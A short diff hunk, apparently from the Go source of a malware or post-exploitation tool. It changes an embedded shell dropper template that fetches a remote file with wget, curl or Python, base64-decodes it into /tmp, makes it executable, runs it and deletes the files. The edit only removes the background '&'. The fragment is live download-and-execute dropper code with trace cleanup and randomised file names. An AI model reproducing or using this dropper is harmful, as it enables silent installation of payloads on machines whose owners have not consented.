@@ -19,7 +19,7 @@ wget -q "$1" -O-||curl -fksL "$1"||python -c "import urllib;u=urllib.urlopen('${
 }
 d '%s'>/tmp/%s&&base64 -d </tmp/%s>/tmp/%s
 chmod +x /tmp/%s
-/tmp/%s&
+/tmp/%s
 rm -f /tmp/%s*`
 	dropper_name := util.RandStr(22)
 	temp_name := dropper_name[:2]
